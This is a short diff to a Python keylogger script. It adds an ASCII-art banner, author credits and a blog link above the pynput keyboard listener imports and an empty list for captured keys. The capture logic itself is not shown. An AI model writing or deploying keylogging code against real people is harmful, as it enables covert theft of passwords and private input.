@@ -1,6 +1,16 @@
 from pynput.keyboard import Key
 from pynput.keyboard import Listener
+from pyfiglet import Figlet
+f = Figlet(font='Rounded')
 
+print(f.renderText('keylogger v0.1'))
+print('                                                                       by Parag Bhangale \n')
+print('       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀')
+print("                           hack3r blog 0.1 - by Parag Bhangale [hack3r]")
+print("                           https://hack3r1.blogspot.com/ | hack3r")
+print(
+    "         keylogger is a simple and light tool for capture the keys generate the log")
+print("\n")
 # creating an empty list to store pressed keys
 the_keys = []
 
